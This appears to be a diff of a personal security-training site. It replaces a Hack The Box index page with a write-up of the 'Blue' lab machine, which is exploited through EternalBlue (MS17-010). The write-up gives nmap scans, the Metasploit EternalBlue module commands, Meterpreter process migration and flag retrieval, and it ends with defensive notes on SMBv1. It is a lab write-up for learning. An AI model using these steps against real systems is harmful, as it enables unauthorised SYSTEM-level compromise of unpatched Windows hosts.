@@ -6,17 +6,13 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Write-ups for HTB lab machines — rooted, documented, and understood.">
+        <meta name="description" content="Windows 7 SP1 with SMB wide open. One CVE, one command, straight to SYSTEM — and a lesson in why Meterpreter session stability matters.">
       
       
         <meta name="author" content="Fudomaru">
       
       
       
-        <link rel="prev" href="../../overthewire/natas/">
-      
-      
-        <link rel="next" href="../twomillion/">
       
       
         
@@ -27,7 +23,7 @@
     
     
       
-        <title>Hack The Box - Digital Dojo</title>
+        <title>Blue - Digital Dojo</title>
       
     
     
@@ -143,7 +139,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#hack-the-box" class="md-skip">
+        <a href="#blue" class="md-skip">
           Skip to content
         </a>
       
@@ -176,7 +172,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Hack The Box
+              Blue
             
           </span>
         </div>
@@ -356,12 +352,10 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
+      <li class="md-tabs__item">
         <a href="../../overview/" class="md-tabs__link">
           
   
@@ -2767,29 +2761,24 @@
       
   
   
-    
   
   
-  
     
     
     
     
       
-        
-        
-      
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
         
           
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
             
   
   
@@ -2807,7 +2796,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             
@@ -2964,8 +2953,6 @@
                 
   
   
-    
-  
   
   
     
@@ -2976,11 +2963,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
         
           
           <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
@@ -3001,7 +2988,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_5_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -3016,37 +3003,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Overview
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../overview/" class="md-nav__link">
         
   
   
@@ -3062,37 +3022,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#machines" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Machines
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -4017,10 +3946,82 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#machines" class="md-nav__link">
+  <a href="#setup" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Machines
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Discovery
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-eternalblue-actually-does" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What EternalBlue actually does
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#running-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Running the exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flags
       
     </span>
   </a>
@@ -4045,64 +4046,6 @@
   
 
 
-  <nav class="md-path" aria-label="Navigation" >
-    <ol class="md-path__list">
-      
-        
-  
-  
-    <li class="md-path__item">
-      <a href="../../.." class="md-path__link">
-        
-  <span class="md-ellipsis">
-    Home
-  </span>
-
-      </a>
-    </li>
-  
-
-      
-      
-        
-  
-  
-    
-    
-      <li class="md-path__item">
-        <a href="../../overview/" class="md-path__link">
-          
-  <span class="md-ellipsis">
-    Challenges
-  </span>
-
-        </a>
-      </li>
-    
-  
-
-      
-        
-  
-  
-    
-    
-      <li class="md-path__item">
-        <a href="./" class="md-path__link">
-          
-  <span class="md-ellipsis">
-    HTB
-  </span>
-
-        </a>
-      </li>
-    
-  
-
-      
-    </ol>
-  </nav>
-
               
               <article class="md-content__inner md-typeset">
                 
@@ -4110,40 +4053,171 @@
 
 
 
-<h1 id="hack-the-box">Hack The Box</h1>
-<p>HackTheBox is where I take on real lab machines in an isolated environment.
-Each box is a small world of its own —
-a misconfigured service, a forgotten credential, a logic flaw waiting to be pulled apart.</p>
-<p>The write-ups here follow the machine from first scan to root.
-No spoilers skipped, no lucky guesses glossed over.
-If something took me an embarrassing amount of time, that stays in.
-The struggle is the point.</p>
-<hr />
-<h2 id="machines">Machines</h2>
+<h1 id="blue">Blue</h1>
 <table>
 <thead>
 <tr>
-<th>Machine</th>
-<th>Difficulty</th>
-<th>OS</th>
-<th>Status</th>
+<th></th>
+<th></th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><a href="../twomillion/">TwoMillion</a></td>
+<td><strong>Difficulty</strong></td>
 <td>Easy</td>
-<td>Linux</td>
-<td>Completed</td>
 </tr>
 <tr>
-<td><a href="../blue/">Blue</a></td>
-<td>Easy</td>
-<td>Windows</td>
-<td>Completed</td>
+<td><strong>OS</strong></td>
+<td>Windows 7 Professional SP1</td>
+</tr>
+<tr>
+<td><strong>CVE</strong></td>
+<td>MS17-010 / CVE-2017-0143 (EternalBlue)</td>
 </tr>
 </tbody>
 </table>
+<p>Blue is a single-CVE box, and deliberately so.
+The machine exists to teach EternalBlue in a controlled environment —
+the same vulnerability that powered WannaCry and NotPetya in 2017.</p>
+<p>The attack chain is short: find SMB, confirm the vulnerability, exploit it, land as SYSTEM.
+No lateral movement, no privilege escalation step, no rabbit holes.
+What makes this box valuable is not the complexity but the depth of understanding you can build around one critical vulnerability.</p>
+<hr />
+<h2 id="setup">Setup</h2>
+<p>Kali VM via QEMU on host. VPN config transferred from the host via a quick HTTP server and pulled with curl.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># on host</span>
+python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+
+<span class="c1"># on Kali VM</span>
+curl<span class="w"> </span>http://192.168.122.1:8000/machines_eu-dedivip-4.ovpn<span class="w"> </span>-o<span class="w"> </span>machines_eu-dedivip-4.ovpn
+openvpn<span class="w"> </span>machines_eu-dedivip-4.ovpn
+</code></pre></div>
+<p>The VPN connected cleanly — <code>Initialization Sequence Completed</code> confirmed the tunnel was up.
+The assigned IP on <code>tun0</code> was <code>10.10.15.139</code>.</p>
+<p>The IPv6 errors in the output (<code>Network is unreachable</code>) are harmless — the VM has no IPv6 gateway,
+so those routes simply fail silently. The IPv4 tunnel works fine.</p>
+<p>If HTTP traffic through the tunnel hangs while ping works, the MTU is the culprit.
+The VPN server pushes <code>tun-mtu 1500</code> but the QEMU NAT layer can't carry packets that large:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>tun0<span class="w"> </span>mtu<span class="w"> </span><span class="m">1200</span>
+</code></pre></div>
+<hr />
+<h2 id="enumeration">Enumeration</h2>
+<p>Start with a connectivity check, then a full service scan:</p>
+<div class="highlight"><pre><span></span><code>ping<span class="w"> </span><span class="m">10</span>.129.24.204
+nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.129.24.204
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152-49157/tcp open msrpc   Microsoft Windows RPC
+</code></pre></div>
+<p>The host information from the SMB scripts filled in the picture immediately:</p>
+<table>
+<thead>
+<tr>
+<th>Detail</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OS</td>
+<td>Windows 7 Professional 7601 Service Pack 1</td>
+</tr>
+<tr>
+<td>Computer name</td>
+<td>HARIS-PC</td>
+</tr>
+<tr>
+<td>Workgroup</td>
+<td>WORKGROUP</td>
+</tr>
+<tr>
+<td>SMB signing</td>
+<td>Disabled</td>
+</tr>
+<tr>
+<td>Guest auth</td>
+<td>Allowed</td>
+</tr>
+</tbody>
+</table>
+<p>Two things stand out.
+First: Windows 7 SP1. End of life since January 2020, meaning no security patches for over six years.
+Second: SMB is open and signing is disabled. That combination on an unpatched Windows 7 machine has one name.</p>
+<hr />
+<h2 id="vulnerability-discovery">Vulnerability Discovery</h2>
+<p>Nmap ships a script that checks specifically for MS17-010 without triggering the exploit:</p>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>--script<span class="w"> </span>smb-vuln-ms17-010<span class="w"> </span>-p<span class="w"> </span><span class="m">445</span><span class="w"> </span><span class="m">10</span>.129.24.204
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+</code></pre></div>
+<p>Confirmed. The box is vulnerable to EternalBlue.</p>
+<hr />
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="what-eternalblue-actually-does">What EternalBlue actually does</h3>
+<p>MS17-010 is a buffer overflow in the way Windows SMBv1 handles <code>Transaction2</code> requests.
+A malformed packet triggers a corruption of the kernel's non-paged pool memory.
+Metasploit uses this corruption to inject shellcode directly into the kernel —
+which means the payload runs with kernel privileges before any user-space security mechanism can interfere.</p>
+<p>The grooming output in the exploit log tells this story step by step:</p>
+<ul>
+<li><strong>SMBv2 buffers</strong> are sent to fill the heap with controlled allocations</li>
+<li><strong>The SMBv1 connection is closed</strong> to create a free hole in exactly the right position</li>
+<li><strong>More SMBv2 buffers</strong> lock the surrounding memory in place</li>
+<li><strong>The exploit packet</strong> overwrites the freed hole and corrupts the pool</li>
+<li><strong>The egg</strong> is delivered to the corrupted connection and the payload executes</li>
+</ul>
+<p>Because execution happens in the kernel, the session comes back as <code>NT AUTHORITY\SYSTEM</code> immediately.</p>
+<h3 id="running-the-exploit">Running the exploit</h3>
+<div class="highlight"><pre><span></span><code>msfconsole
+use<span class="w"> </span>exploit/windows/smb/ms17_010_eternalblue
+<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">10</span>.129.24.204
+<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">10</span>.10.15.139
+run
+</code></pre></div>
+<p>The first run landed a session but it was unstable — running <code>cat</code> on the Administrator flag returned:</p>
+<div class="highlight"><pre><span></span><code>[-] stdapi_fs_stat: Operation failed: Not enough storage is available to process this command.
+</code></pre></div>
+<p>This is a known issue with EternalBlue sessions. The Meterpreter payload lands inside an unstable kernel thread. Certain operations — including spawning a child process like <code>cmd.exe</code> — exceed what that thread can handle and crash the session. The fix is to immediately migrate to a stable user-space process after landing:</p>
+<div class="highlight"><pre><span></span><code>meterpreter &gt; migrate -N spoolsv.exe
+</code></pre></div>
+<p><code>spoolsv.exe</code> (the Windows print spooler) runs as SYSTEM and is always present. Migrating into it moves the payload from the fragile kernel thread into a stable process, and all subsequent operations work normally.</p>
+<p>On the second run the exploit retried automatically with a higher groom count (17 instead of 12) and the session came back cleanly.</p>
+<div class="highlight"><pre><span></span><code>[+] 10.129.24.204:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+meterpreter &gt;
+</code></pre></div>
+<hr />
+<h2 id="flags">Flags</h2>
+<p>With a SYSTEM session, both flags are directly readable. No privilege escalation needed.</p>
+<div class="highlight"><pre><span></span><code>meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter &gt; cat C:\\Users\\haris\\Desktop\\user.txt
+</code></pre></div>
+<!-- f4cadb1bca1e93aa62cd33f3135e5ee6 -->
+
+<p><strong>User flag captured.</strong></p>
+<div class="highlight"><pre><span></span><code>meterpreter &gt; cat C:\\Users\\Administrator\\Desktop\\root.txt
+</code></pre></div>
+<!-- b0dd39104a46b1fb10f228648845d99f -->
+
+<p><strong>Root flag captured. Box complete.</strong></p>
+<hr />
+<div class="admonition example">
+<p class="admonition-title">Conclusion</p>
+<p>Blue is deliberately simple — the learning is in understanding why EternalBlue works, not just that it works.
+The kernel pool grooming, the SMBv1/SMBv2 interplay, the reason the session lands as SYSTEM without any extra steps — these are worth understanding, not just memorising the Metasploit commands.</p>
+<p>The unstable session issue was a good bonus lesson. EternalBlue sessions are fragile until migrated.
+On any real engagement — or on the CJCA exam — the first thing to do after landing a Meterpreter shell is migrate into a stable process. <code>spoolsv.exe</code> or <code>explorer.exe</code> are reliable targets.</p>
+<p>From the defensive side: this box is a perfect illustration of why unpatched SMBv1 on an internet-facing or internal machine is a critical finding. MS17-010 requires no credentials, no user interaction, and no foothold. It goes from zero to SYSTEM in under a minute.</p>
+</div>
 
 
 
@@ -4177,44 +4251,6 @@ The struggle is the point.</p>
       
         <footer class="md-footer">
   
-    
-      
-      <nav class="md-footer__inner md-grid" aria-label="Footer" >
-        
-          
-          <a href="../../overthewire/natas/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Natas">
-            <div class="md-footer__button md-icon">
-              
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
-            </div>
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Previous
-              </span>
-              <div class="md-ellipsis">
-                Natas
-              </div>
-            </div>
-          </a>
-        
-        
-          
-          <a href="../twomillion/" class="md-footer__link md-footer__link--next" aria-label="Next: TwoMillion">
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              <div class="md-ellipsis">
-                TwoMillion
-              </div>
-            </div>
-            <div class="md-footer__button md-icon">
-              
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
-            </div>
-          </a>
-        
-      </nav>
     
   
   <div class="md-footer-meta md-typeset">
